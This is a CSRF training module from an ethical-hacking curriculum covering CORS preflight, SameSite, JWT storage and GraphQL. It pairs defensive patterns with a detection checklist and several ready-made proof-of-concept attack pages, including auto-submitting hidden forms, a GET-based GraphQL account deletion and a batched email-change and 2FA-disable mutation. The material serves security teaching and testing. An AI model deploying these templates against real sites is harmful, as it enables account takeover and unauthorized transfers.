# CSRF Module 08 — JSON APIs, SPAs & Modern Architecture
> **Curriculum:** CSRF Mastery for Ethical Hacking & Bug Bounty  
> **Module:** 08 of 12  
> **Topic:** CORS Preflight, Content-Type Defense, SPA Auth Patterns, JWT Delivery, GraphQL CSRF  
> **Level:** Advanced — applies CSRF fundamentals to modern API-driven architectures

---

## Table of Contents
1. [The Core Principle — Credential Delivery Is Everything](#1-the-core-principle--credential-delivery-is-everything)
2. [CORS Preflight — Complete Mechanism](#2-cors-preflight--complete-mechanism)
3. [When Preflight Protects vs When It Fails](#3-when-preflight-protects-vs-when-it-fails)
4. [Content-Type Validation — Partial Defense Analysis](#4-content-type-validation--partial-defense-analysis)
5. [SPA + API Architecture — Same-Site Boundary](#5-spa--api-architecture--same-site-boundary)
6. [fetch() credentials — Complete Behavior Reference](#6-fetch-credentials--complete-behavior-reference)
7. [The Request/Response Asymmetry](#7-the-requestresponse-asymmetry)
8. [JWT Authentication — CSRF Safety by Delivery Method](#8-jwt-authentication--csrf-safety-by-delivery-method)
9. [SPA-Specific CSRF Defense Patterns](#9-spa-specific-csrf-defense-patterns)
10. [The "Remember Me" Cookie Trap](#10-the-remember-me-cookie-trap)
11. [GraphQL and CSRF](#11-graphql-and-csrf)
12. [CORS Policy and CSRF Interaction](#12-cors-policy-and-csrf-interaction)
13. [Cross-Origin vs Cross-Site in SPA Architecture](#13-cross-origin-vs-cross-site-in-spa-architecture)
14. [Custom Header Defense — Scope and Limits](#14-custom-header-defense--scope-and-limits)
15. [PoC Templates for Modern API CSRF](#15-poc-templates-for-modern-api-csrf)
16. [Detection Methodology — Modern Architecture](#16-detection-methodology--modern-architecture)
17. [Key Terminology Reference](#17-key-terminology-reference)
18. [Common Misconceptions](#18-common-misconceptions)
19. [Bug Bounty Reference](#19-bug-bounty-reference)
20. [Module 8 Summary — What You Must Know Cold](#20-module-8-summary--what-you-must-know-cold)

---

## 1. The Core Principle — Credential Delivery Is Everything

The single most important concept in this module:

> **CSRF risk is determined by how authentication credentials travel — not by technology stack, architecture pattern, API format, or request structure.**

```
┌─────────────────────────────────────────────────────────────────┐
│              CREDENTIAL DELIVERY → CSRF RISK                    │
├──────────────────────────────┬──────────────────────────────────┤
│ Credential travels via       │ CSRF Risk                        │
├──────────────────────────────┼──────────────────────────────────┤
│ Session cookie               │ HIGH — ambient authority         │
│ JWT in HttpOnly cookie       │ HIGH — same as session cookie    │
│ JWT in non-HttpOnly cookie   │ HIGH — same as session cookie    │
│ Remember-me cookie           │ HIGH — ambient authority         │
│ Any cookie                   │ HIGH — browser auto-attaches     │
├──────────────────────────────┼──────────────────────────────────┤
│ JWT in localStorage + header │ NONE — explicit attachment only  │
│ JWT in sessionStorage + hdr  │ NONE — explicit attachment only  │
│ API key in custom header     │ NONE — explicit attachment only  │
│ Bearer token in Auth header  │ NONE — explicit attachment only  │
└──────────────────────────────┴──────────────────────────────────┘

Architecture type is IRRELEVANT:
  Traditional web app + cookie = CSRF vulnerable
  SPA + cookie                 = CSRF vulnerable
  REST API + cookie            = CSRF vulnerable
  GraphQL API + cookie         = CSRF vulnerable
  Microservices + cookie       = CSRF vulnerable
  Mobile app backend + cookie  = CSRF vulnerable
```

---

## 2. CORS Preflight — Complete Mechanism

### What Triggers a Preflight

```
SIMPLE REQUESTS — Browser sends directly, no preflight:
  Methods:        GET, POST, HEAD
  Content-Types:  application/x-www-form-urlencoded
                  multipart/form-data
                  text/plain
  Headers:        Only CORS-safelisted headers
  
  → No preflight → no CORS gate before request
  → Cookies attached based on SameSite rules
  → HTML forms can produce these

PREFLIGHTED REQUESTS — OPTIONS sent first:
  Methods:        PUT, DELETE, PATCH (any non-simple)
  Content-Types:  application/json ← most SPA API calls
                  application/xml
                  anything not in simple list
  Headers:        Any custom header (Authorization, X-CSRF-Token, X-App-Client)
  
  → Browser sends OPTIONS preflight first
  → Actual request only sent if preflight is approved
  → HTML forms CANNOT produce preflighted content types
```

### The Complete Preflight Exchange

```http
══════════════ STEP 1: PREFLIGHT REQUEST (browser sends) ══════════════
OPTIONS /api/transfer HTTP/1.1
Host: api.victim.com
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type

══════════════ STEP 2A: PREFLIGHT APPROVED (server responds) ══════════
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.victim.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

══════════════ STEP 2B: PREFLIGHT REJECTED (server responds) ══════════
HTTP/1.1 403 Forbidden
(no CORS headers)

══════════════ STEP 3A: IF APPROVED — Actual Request ══════════════════
POST /api/transfer HTTP/1.1
Host: api.victim.com
Origin: https://evil.com        ← evil.com was approved
Cookie: session=abc123          ← attached if ACAO+ACAC allow credentials
Content-Type: application/json

{"to":"attacker","amount":5000}

══════════════ STEP 3B: IF REJECTED — Request Blocked ═════════════════
Browser blocks the actual POST from being sent
No cookies attached, no request reaches server
```

### The Key Insight

```
Preflight is NOT a security mechanism.
Preflight is a CORS gate that defers entirely to the CORS policy.

If CORS policy is correct (only allows legitimate origin):
  → evil.com's preflight rejected → actual request blocked → CSRF prevented

If CORS policy is wrong (allows attacker origin or wildcard):
  → evil.com's preflight approved → actual request sent → CSRF succeeds

Security comes from the CORS POLICY, not from the existence of preflight.
```

---

## 3. When Preflight Protects vs When It Fails

```
PREFLIGHT PROTECTS WHEN:
  ✓ CORS policy explicitly allowlists only legitimate origins
  ✓ Attacker's origin is not in allowlist
  ✓ Server returns 403/no CORS headers for unknown origins
  ✓ Access-Control-Allow-Credentials: true only for trusted origins

PREFLIGHT DOES NOT PROTECT WHEN:
  ✗ CORS policy reflects any Origin header blindly
      if (origin) { res.header('ACAO', origin); }  ← vulnerable
  
  ✗ CORS uses wildcard (but this actually prevents credentials)
      ACAO: * + ACAC: true = browser blocks (see Section 12)
  
  ✗ Attacker is on same-site subdomain
      feedback.victim.com → api.victim.com:
        Different origin → CORS does apply
        CORS allowlist decides whether subdomain is trusted
        If subdomain not allowlisted → preflight fails → blocked
        If subdomain allowlisted or CORS misconfigured → passes
  
  ✗ Request is a simple request (no preflight needed)
      GET, POST with form content types → no preflight
      Cookies still attached based on SameSite
  
  ✗ GET requests (never trigger preflight regardless)
      GET /graphql?query=mutation{...} → no preflight
      Session cookie sent (SameSite=Lax navigation exception)
```

---

## 4. Content-Type Validation — Partial Defense Analysis

### Why Developers Think It Works

```
HTML forms can only produce:
  Content-Type: application/x-www-form-urlencoded  (default)
  Content-Type: multipart/form-data
  Content-Type: text/plain

HTML forms CANNOT produce:
  Content-Type: application/json  ← requires JavaScript fetch()
  Content-Type: application/xml

Therefore: if server requires application/json →
  HTML form CSRF cannot produce correct Content-Type →
  Server rejects → CSRF via form fails ✓
```

### Why It Is Insufficient as a Primary Defense

```
BYPASS 1: Same-site XSS with fetch()
  XSS on feedback.victim.com:
    fetch("https://api.victim.com/transfer", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ to: "attacker", amount: 5000 })
    });
  Same-site → CORS may apply but same-site cookie sent if CORS allows
  Content-Type: application/json correctly set
  → Content-Type check passes, CSRF succeeds

BYPASS 2: CORS misconfiguration allows attacker origin
  evil.com makes fetch() with application/json
  Misconfigured CORS approves preflight
  Actual request proceeds with session cookie
  Content-Type: application/json set correctly by fetch()
  → Content-Type check passes, CSRF succeeds

BYPASS 3: text/plain carrying JSON body
  <form enctype="text/plain" method="POST">
    <input name='{"to":"attacker","amount":5000,"x":"' value='"}'>
  </form>
  Body: {"to":"attacker","amount":5000,"x":"="}
  Content-Type: text/plain (simple request, no preflight)
  If server parses body as JSON regardless of Content-Type:
  → Content-Type check bypassed, CSRF succeeds

BYPASS 4: Server doesn't actually validate value
  Some servers check header exists but don't validate value:
  if "Content-Type" in request.headers: proceed()
  → Send any Content-Type → passes check
```

### The Rule

```
Content-Type: application/json is defense-in-depth, not primary defense.

It raises the bar by:
  → Requiring preflight for cross-origin fetch()
  → Preventing simple HTML form CSRF

It does NOT protect against:
  → Same-site attackers (CORS may not apply or may allow them)
  → CORS misconfiguration (preflight passes for attacker)
  → text/plain JSON body (bypasses both preflight and check)
  → Servers with loose Content-Type validation

Always combine with CSRF tokens or custom headers as primary defense.
```

---

## 5. SPA + API Architecture — Same-Site Boundary

### The Subdomain Isolation Illusion

```
Developer assumption:
  "API is at api.victim.com — separate from app.victim.com — so it's isolated"

Reality:
  app.victim.com and api.victim.com share registrable domain victim.com
  They are SAME-SITE
  SameSite cookie restrictions do NOT apply between them

Session cookie set by api.victim.com with SameSite=Lax:
  Request from app.victim.com → api.victim.com:
    Same-site → cookie sent ✓ (correct, intended)
  
  Request from feedback.victim.com → api.victim.com:
    Same-site → cookie sent ✓ (attacker can exploit this)
  
  Request from evil.victim.com (taken over) → api.victim.com:
    Same-site → cookie sent ✓ (attacker exploits this)
  
  Request from evil.com → api.victim.com:
    Cross-site → cookie blocked on POST (Lax protection works here)
```

### What the Attack Surface Actually Is

```
In any victim.com SPA + API architecture:
  The CSRF attack surface is the entire *.victim.com subdomain space

XSS on ANY subdomain of victim.com:
  → Can make credentialed requests to api.victim.com
  → Session cookie sent automatically (same-site)
  → SameSite provides NO isolation between subdomains

Subdomain takeover of ANY *.victim.com:
  → Attacker-controlled origin sends requests to api.victim.com
  → Same-site → cookie sent

Defense implication:
  All subdomains of victim.com must be secured
  Any weak subdomain is a potential CSRF entry point to the API
  CORS allowlist on api.victim.com controls cross-origin (not cross-site) access
```

### CORS as the Cross-Origin Defense Layer

```
Between subdomains (cross-origin, same-site):
  SameSite: does NOT restrict (same-site)
  CORS:     DOES apply (different origin)
  
  feedback.victim.com → api.victim.com:
    CORS preflight sent
    api.victim.com CORS policy decides:
      Allow feedback.victim.com? → cookie sent, request processed
      Deny feedback.victim.com?  → preflight rejected, request blocked

Between different domains (cross-origin, cross-site):
  SameSite: DOES restrict (Lax/Strict)
  CORS:     DOES apply (different origin)
  
  evil.com → api.victim.com:
    SameSite=Lax: cookie not sent on POST (cross-site POST blocked)
    Even if CORS allows it: no cookie → unauthenticated request

Two independent defense layers:
  SameSite: defends against cross-site
  CORS:     defends against cross-origin (including same-site subdomains)
```

---

## 6. fetch() credentials — Complete Behavior Reference

### The Three Modes

```javascript
// Mode 1: omit — never send cookies
fetch('/api/data', { credentials: 'omit' });
// Use for: public endpoints, unauthenticated requests

// Mode 2: same-origin (DEFAULT if credentials omitted)
fetch('/api/data', { credentials: 'same-origin' });
// Send cookies only for same-origin requests
// Cross-origin: no cookies sent
// Use for: typical same-origin AJAX

// Mode 3: include — always try to send cookies
fetch('/api/data', { credentials: 'include' });
// Attempt to attach cookies on all requests
// Still subject to SameSite enforcement
// Use for: cross-origin authenticated SPA API calls
```

### What Determines Whether Cookie Is Actually Attached

```
credentials: 'include' is a REQUEST to attach cookies.
Browser then applies SameSite rules:

┌──────────────────────────┬────────────┬────────────┬────────────┐
│ Request from → to        │ Strict     │ Lax        │ None       │
├──────────────────────────┼────────────┼────────────┼────────────┤
│ app.victim.com →         │            │            │            │
│   api.victim.com (POST)  │ ✅ Sent    │ ✅ Sent    │ ✅ Sent    │
│ (same-site)              │            │            │            │
├──────────────────────────┼────────────┼────────────┼────────────┤
│ feedback.victim.com →    │            │            │            │
│   api.victim.com (POST)  │ ✅ Sent    │ ✅ Sent    │ ✅ Sent    │
│ (same-site)              │            │            │            │
├──────────────────────────┼────────────┼────────────┼────────────┤
│ evil.com →               │            │            │            │
│   api.victim.com (POST)  │ ❌ Blocked │ ❌ Blocked │ ✅ Sent    │
│ (cross-site)             │            │            │            │
├──────────────────────────┼────────────┼────────────┼────────────┤
│ evil.com →               │            │            │            │
│   api.victim.com (GET    │ ❌ Blocked │ ✅ Sent    │ ✅ Sent    │
│   top-level nav)         │            │ (Lax exc.) │            │
└──────────────────────────┴────────────┴────────────┴────────────┘

credentials: 'include' does NOT override SameSite.
It is a browser instruction, not a bypass mechanism.
```

---

## 7. The Request/Response Asymmetry

Critical distinction for CSRF impact assessment:

```
TWO INDEPENDENT CORS CONTROLS:

1. COOKIE ATTACHMENT (request side):
   Controlled by: SameSite cookie attribute
   credentials: 'include' requests attachment
   SameSite may deny it
   
   Relevant for: Does the request carry authentication?

2. RESPONSE EXPOSURE (response side):
   Controlled by: Access-Control-Allow-Credentials: true
   Browser exposes response to JS only if server sends ACAC: true
   
   Relevant for: Can attacker READ the response?

CSRF IMPLICATIONS:

Scenario A: Cookie sent, response blocked
  Request carries session cookie → server executes action (CSRF side effect!)
  Response blocked by CORS → attacker cannot read data
  → BLIND CSRF still possible (action executes, attacker can't confirm)

Scenario B: Cookie not sent, response accessible
  No authentication → server rejects or handles as anonymous
  Attacker can read response → but it's unauthenticated data
  → No CSRF impact

Scenario C: Cookie sent, response accessible
  Full credentialed cross-origin request AND response readable
  → CSRF + data exfiltration
  → Requires: ACAO: [attacker-origin] + ACAC: true

Scenario D: Cookie not sent, response blocked
  Standard cross-origin request without credentials
  → No CSRF, no data access
  → Default for cross-origin requests without credentials: 'include'
```

---

## 8. JWT Authentication — CSRF Safety by Delivery Method

### localStorage + Authorization Header (CSRF Safe)

```javascript
// Login response
const { jwt } = await loginResponse.json();
localStorage.setItem('authToken', jwt);

// Every authenticated request
const token = localStorage.getItem('authToken');
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ to: 'bob', amount: 100 })
  // NOTE: credentials: 'include' NOT needed — no cookie used
});
```

```
Why CSRF safe:
  ✓ localStorage is origin-scoped (SOP enforced by browser)
  ✓ Cross-origin pages cannot read app.victim.com's localStorage
  ✓ Authorization header cannot be set by HTML form or <img> tag
  ✓ Forged requests cannot carry the JWT
  ✓ No ambient authority — explicit attachment required
  
XSS risk:
  ✗ Same-origin XSS can read localStorage
  ✗ XSS steals JWT → attacker makes authenticated requests from anywhere
```

### JWT in HttpOnly Cookie (CSRF Vulnerable)

```http
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiJ9...; HttpOnly; Secure; SameSite=Lax
```

```
Why CSRF vulnerable:
  ✗ Cookie sent automatically by browser (ambient authority)
  ✗ JWT FORMAT provides zero CSRF protection
  ✗ HttpOnly protects from XSS read but NOT from CSRF
  ✗ SameSite=Lax provides partial protection only

Common mistake:
  "We use JWTs so we don't need CSRF protection"
  Reality: JWT in cookie = session ID in cookie for CSRF purposes
  The cryptographic properties of JWT are irrelevant to CSRF
```

### Hybrid Pattern (Recommended for HttpOnly Cookie)

```javascript
// Server: JWT in HttpOnly cookie + CSRF token in response body
// Login response:
{
  "user": { "id": 42, "name": "Alice" },
  "csrfToken": "xK9mP2qL..."  // readable by JS (not HttpOnly)
}

// Client: store CSRF token in memory (not localStorage)
let csrfToken = loginResponse.csrfToken;

// Every state-changing request:
fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include',      // sends JWT cookie
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken  // explicit intent proof
  },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});
```

### JWT Security Model Comparison

```
┌──────────────────────────────┬────────────┬──────────────┬──────────────┐
│ Storage & Delivery           │ CSRF Risk  │ XSS Token    │ Notes        │
│                              │            │ Exposure     │              │
├──────────────────────────────┼────────────┼──────────────┼──────────────┤
│ JWT in localStorage + header │ NONE       │ HIGH         │ XSS steals   │
│ JWT in sessionStorage + hdr  │ NONE       │ HIGH         │ Clears on    │
│                              │            │              │ tab close    │
│ JWT in HttpOnly cookie       │ HIGH       │ LOW          │ Need CSRF    │
│                              │            │              │ token too    │
│ JWT in cookie + CSRF token   │ VERY LOW   │ MEDIUM       │ Best for     │
│                              │            │              │ HttpOnly     │
│ JWT in non-HttpOnly cookie   │ HIGH       │ HIGH         │ Worst of     │
│                              │            │              │ both worlds  │
└──────────────────────────────┴────────────┴──────────────┴──────────────┘
```

---

## 9. SPA-Specific CSRF Defense Patterns

### Pattern 1 — CSRF Token in Response Header

```http
HTTP/1.1 200 OK
X-CSRF-Token: xK9mP2qL...
Content-Type: application/json
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

```javascript
// App bootstrap: fetch session and extract CSRF token
const resp = await fetch('/api/session', { credentials: 'include' });
const csrfToken = resp.headers.get('X-CSRF-Token');

// Store in memory (module-level variable, not localStorage)
// Send on every state-changing request
fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});
```

### Pattern 2 — Double Submit in SPA (with non-HttpOnly CSRF cookie)

```javascript
// Server sets two cookies:
// session=abc123 (HttpOnly — JS cannot read)
// csrf-token=xK9mP2 (not HttpOnly — JS can read)

function getCookie(name) {
  return document.cookie
    .split('; ')
    .find(row => row.startsWith(name + '='))
    ?.split('=')[1];
}

const csrfToken = getCookie('csrf-token');

fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken  // custom header (not a cookie)
  },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});

// Server validates:
//   cookie csrf-token value == X-CSRF-Token header value
// Attacker cannot read csrf-token cookie (SOP)
// Attacker cannot set X-CSRF-Token header on forged request (cross-origin)
```

### Pattern 3 — Stateless HMAC Token (for Microservices)

```python
# Server generates token (no session store needed)
import hmac, hashlib, time, secrets

SECRET = b"server_secret_never_expose"

def generate_csrf_token(user_id: str) -> str:
    timestamp = str(int(time.time()))
    nonce = secrets.token_hex(8)
    message = f"{user_id}:{timestamp}:{nonce}"
    signature = hmac.new(SECRET, message.encode(), hashlib.sha256).hexdigest()
    return f"{message}:{signature}"

def validate_csrf_token(token: str, user_id: str) -> bool:
    try:
        parts = token.rsplit(':', 1)
        message, signature = parts[0], parts[1]
        uid, timestamp, nonce = message.split(':')
        
        # Validate user binding
        if uid != user_id:
            return False
        
        # Validate not expired (10 minute window)
        if int(time.time()) - int(timestamp) > 600:
            return False
        
        # Validate HMAC
        expected = hmac.new(SECRET, message.encode(), hashlib.sha256).hexdigest()
        return hmac.compare_digest(signature, expected)
    except:
        return False
```

---

## 10. The "Remember Me" Cookie Trap

Adding any cookie-based authentication to an application that previously used header-based auth introduces CSRF risk.

```
BEFORE (CSRF safe):
  Authentication: JWT in Authorization: Bearer header
  CSRF risk: NONE

ADDED FEATURE:
  Set-Cookie: remember=xyz; HttpOnly; Secure; SameSite=Lax

API ENDPOINT LOGIC:
  if valid_jwt_in_header OR valid_remember_cookie:
      authenticate_request()

AFTER (CSRF vulnerable):
  Any endpoint accepting remember cookie is now CSRF-vulnerable
  Browser attaches remember cookie automatically on same-site requests
  Attacker forges request → no JWT in header → but remember cookie sent
  → Server authenticates via cookie → action executes

VULNERABLE ENDPOINTS:
  All endpoints that accept cookie-based authentication as an alternative
  Even if JWT header is the primary mechanism

FIX:
  Separate authentication paths:
    Header-authenticated endpoints: never check cookie
    Cookie-authenticated endpoints: implement CSRF token
  OR: Add CSRF token requirement for all cookie-authenticated paths
```

---

## 11. GraphQL and CSRF

### Standard JSON POST (Same as REST API)

```javascript
fetch('/graphql', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    query: `mutation { transferFunds(to: "bob", amount: 100) { success } }`
  })
});
```

CSRF risk: Identical to any JSON API POST endpoint.

### GET-Based GraphQL Mutations (Highest Risk)

```
Some GraphQL servers accept queries AND mutations via GET:
  GET /graphql?query=mutation{deleteAccount(confirm:true){success}}

This is:
  A state-changing action via GET
  SameSite=Lax explicitly allows cross-site GET navigation cookies
  No CORS preflight (GET never triggers preflight)
  Zero user interaction required with meta refresh

Should NEVER be allowed in production:
  Disable GET mutations on all GraphQL endpoints
  Accept mutations via POST only
```

### GET GraphQL CSRF PoC

```html
<!DOCTYPE html>
<html>
<head>
  <!-- Zero interaction — top-level GET navigation -->
  <!-- SameSite=Lax cookie IS sent on this request -->
  <meta http-equiv="refresh"
        content="0; url=https://api.victim.com/graphql?query=mutation{deleteAccount(confirm:true){success}}">
</head>
<body><p>Loading...</p></body>
</html>
```

Alternative (also zero interaction):
```html
<script>
  window.location.href =
    "https://api.victim.com/graphql?query=mutation{deleteAccount(confirm:true){success}}";
</script>
```

Why SameSite=Lax fails here:
```
Lax BLOCKS: cross-site POST → form-based CSRF
Lax ALLOWS: cross-site GET top-level navigation → GET mutation CSRF

This is the Module 4 GET blind spot applied to GraphQL.
The fix is disabling GET mutations, not relying on SameSite.
```

### GraphQL Batching — Multiple Mutations in One Request

```javascript
// CSRF via batched mutations
fetch('/graphql', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify([
    { query: 'mutation { changeEmail(email: "attacker@evil.com") { success } }' },
    { query: 'mutation { disableTwoFactor { success } }' },
    { query: 'mutation { transferFunds(to: "attacker", amount: 10000) { success } }' }
  ])
});
// Single CSRF request executes three separate account-takeover actions
```

---

## 12. CORS Policy and CSRF Interaction

### Safe CORS Configuration

```python
ALLOWED_ORIGINS = {
    "https://app.victim.com",
    "https://www.victim.com"
}

def cors_middleware(request, response):
    origin = request.headers.get("Origin")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type, X-CSRF-Token"
    # If origin not in allowlist: no CORS headers sent → preflight fails
```

### Dangerous CORS Patterns

```python
# PATTERN 1: Blind reflection (MOST DANGEROUS)
origin = request.headers.get("Origin", "")
response.headers["ACAO"] = origin          # reflects ANY origin
response.headers["ACAC"] = "true"
# → Any origin can make credentialed cross-origin requests

# PATTERN 2: Wildcard with credentials (browser blocks but shows intent)
response.headers["ACAO"] = "*"
response.headers["ACAC"] = "true"
# → Browser blocks (cannot use wildcard + credentials)
# → But shows misconfigured intent

# PATTERN 3: Overly broad allowlist
ALLOWED_ORIGINS = ["https://app.victim.com", "https://dev.victim.com",
                   "https://staging.victim.com", "null"]
# → Staging/dev may be less secure
# → null allowlist enables sandboxed iframe attack

# PATTERN 4: Substring check
if "victim.com" in origin:
    response.headers["ACAO"] = origin
# → victim.com.attacker.com passes this check
```

### CORS + CSRF Risk Matrix

```
┌──────────────────────────────┬────────────────────────────────────────┐
│ CORS Configuration           │ CSRF Risk from Cross-Origin Attacker   │
├──────────────────────────────┼────────────────────────────────────────┤
│ No CORS headers              │ LOW — preflight blocks JSON fetch()    │
│                              │ Form-based CSRF still possible          │
├──────────────────────────────┼────────────────────────────────────────┤
│ ACAO: specific origin only   │ LOW — only allowlisted origin can fetch │
│ + ACAC: true                 │ Attacker blocked at preflight           │
├──────────────────────────────┼────────────────────────────────────────┤
│ ACAO: * (no credentials)     │ LOW for CSRF — wildcard blocks creds   │
│                              │ Unauthenticated data readable           │
├──────────────────────────────┼────────────────────────────────────────┤
│ ACAO: reflects origin        │ CRITICAL — any origin gets credentialed │
│ + ACAC: true                 │ full JSON CSRF + response read          │
├──────────────────────────────┼────────────────────────────────────────┤
│ ACAO: null + ACAC: true      │ HIGH — sandboxed iframe CSRF           │
└──────────────────────────────┴────────────────────────────────────────┘
```

---

## 13. Cross-Origin vs Cross-Site in SPA Architecture

This distinction determines which defense layer applies.

```
┌─────────────────────────────────────────────────────────────────┐
│          RELATIONSHIP MATRIX FOR SPA ARCHITECTURE               │
├──────────────────────┬────────────────┬────────────────────────┤
│ Request From → To    │ Relationship   │ Defense Layer          │
├──────────────────────┼────────────────┼────────────────────────┤
│ app.victim.com →     │ Cross-origin   │ CORS policy on         │
│ api.victim.com       │ SAME-SITE      │ api.victim.com         │
│                      │                │ SameSite: no restrict. │
├──────────────────────┼────────────────┼────────────────────────┤
│ other.victim.com →   │ Cross-origin   │ CORS policy on         │
│ api.victim.com       │ SAME-SITE      │ api.victim.com         │
│ (XSS or takeover)    │                │ SameSite: no restrict. │
├──────────────────────┼────────────────┼────────────────────────┤
│ evil.com →           │ Cross-origin   │ CORS policy            │
│ api.victim.com       │ CROSS-SITE     │ SameSite (Lax/Strict)  │
│                      │                │ Both layers apply      │
└──────────────────────┴────────────────┴────────────────────────┘

KEY INSIGHT:
For same-site cross-origin requests (subdomain → API):
  SameSite does NOT restrict (same-site)
  CORS is the ONLY defense layer
  Correct CORS allowlist is critical
```

---

## 14. Custom Header Defense — Scope and Limits

### How It Works

```javascript
// Client includes custom header on every request
fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});

// Server validates header presence
if not request.headers.get('X-Requested-With'):
    return 403
```

### Why It Works for Cross-Origin Attackers

```
Custom header triggers CORS preflight
Server rejects preflight from non-allowlisted origins
HTML forms cannot set custom headers
→ Forged cross-origin requests cannot include the header
→ Server rejects requests without it
```

### Why It Fails for Same-Site Attackers

```
XSS on feedback.victim.com can freely set any header:
  fetch("https://api.victim.com/transfer", {
    headers: { "X-Requested-With": "XMLHttpRequest" }
  });

If CORS allowlist includes feedback.victim.com (or CORS is permissive):
  Preflight passes
  Custom header present
  Session cookie sent (same-site)
  → Custom header defense completely bypassed

For same-site subdomains:
  Custom header alone is insufficient
  MUST combine with CSRF token for defense-in-depth
```

---

## 15. PoC Templates for Modern API CSRF

### JSON API via fetch() (CORS Misconfiguration Required)

```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch("https://api.victim.com/user/transfer", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ to: "attacker", amount: 5000 })
})
.then(r => r.json())
.then(data => console.log(data))  // Only works if ACAO+ACAC allows attacker
.catch(e => console.log(e));
</script>
</body>
</html>
```

### text/plain JSON Body (No CORS Required)

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://api.victim.com/transfer"
        method="POST"
        enctype="text/plain"
        style="display:none">
    <input type="hidden"
           name='{"to":"attacker","amount":5000,"x":"'
           value='"}'>
  </form>
</body>
</html>
```

### GraphQL Mutation via GET (SameSite=Lax Bypass)

```html
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh"
        content="0; url=https://api.victim.com/graphql?query=mutation{deleteAccount(confirm:true){success}}">
</head>
<body><p>Loading...</p></body>
</html>
```

### GraphQL POST via text/plain

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://api.victim.com/graphql"
        method="POST"
        enctype="text/plain"
        style="display:none">
    <input type="hidden"
           name='{"query":"mutation { transferFunds(to: \"attacker\", amount: 5000) { success } }","x":"'
           value='"}'>
  </form>
</body>
</html>
```

### Cross-Subdomain XSS Chain (Same-Site Attack)

```javascript
// XSS payload on feedback.victim.com targeting api.victim.com
(async () => {
  // Step 1: Read CSRF token if needed (CORS must allow feedback subdomain)
  // Step 2: Forge authenticated API request
  await fetch("https://api.victim.com/user/change-email", {
    method: "POST",
    credentials: "include",   // same-site → session cookie sent
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": "TOKEN_IF_OBTAINABLE"
    },
    body: JSON.stringify({ email: "attacker@evil.com" })
  });
})();
```

---

## 16. Detection Methodology — Modern Architecture

```
STEP 1 — Identify authentication mechanism
  □ Check Set-Cookie headers on login response
  □ Check Authorization headers in API requests
  □ If session/JWT in cookie → CSRF surface exists
  □ If only Authorization: Bearer → likely CSRF safe (verify no cookie fallback)

STEP 2 — Map the subdomain architecture
  □ Enumerate all subdomains (subfinder, amass)
  □ Identify which are same-site as the API
  □ Check for subdomain takeover opportunities
  □ Any subdomain with XSS = potential CSRF pivot to API

STEP 3 — Analyze CORS policy
  □ Send OPTIONS preflight with Origin: https://evil.com
  □ Check Access-Control-Allow-Origin in response
  □ Check Access-Control-Allow-Credentials value
  □ Test: does CORS reflect the Origin header?
  □ Test: is Origin: null allowlisted?
  □ Any subdomain that CORS allows = attack surface

STEP 4 — Test Content-Type validation
  □ Send request with wrong Content-Type → rejected?
  □ Send text/plain with JSON body → processed?
  □ Send application/json without CSRF token → rejected?
  □ Is Content-Type the ONLY CSRF defense?

STEP 5 — Check for CSRF tokens in API requests
  □ Inspect API calls in browser DevTools
  □ Look for X-CSRF-Token, X-Requested-With headers
  □ Look for csrf_token in request body
  □ If absent: note as potentially vulnerable

STEP 6 — Test GraphQL specifically
  □ Send mutation via GET → accepted?
  □ Is batching enabled? Test multiple mutations
  □ Does introspection reveal mutation endpoints?

STEP 7 — Test "remember me" and alternative auth paths
  □ Log in with remember me → check cookies set
  □ Make API call with only cookie (no Auth header) → works?
  □ If yes: cookie-authenticated endpoints are CSRF surface

STEP 8 — Build PoC for viable vectors
  □ text/plain form if server parses JSON from text/plain
  □ fetch() chain if CORS misconfigured
  □ GET mutation if GraphQL accepts GET mutations
  □ Same-site XSS chain if subdomain XSS exists
```

---

## 17. Key Terminology Reference

| Term | Definition |
|------|------------|
| **Simple request** | Cross-origin request that doesn't trigger CORS preflight (GET/POST/HEAD + limited content types) |
| **Preflighted request** | Cross-origin request preceded by OPTIONS check (JSON, custom headers, non-simple methods) |
| **CORS preflight** | Browser OPTIONS request verifying server allows the cross-origin request before sending it |
| **credentials: include** | fetch() mode that attempts to attach cookies; still subject to SameSite rules |
| **ACAC** | Access-Control-Allow-Credentials — server header exposing response to credentialed cross-origin JS |
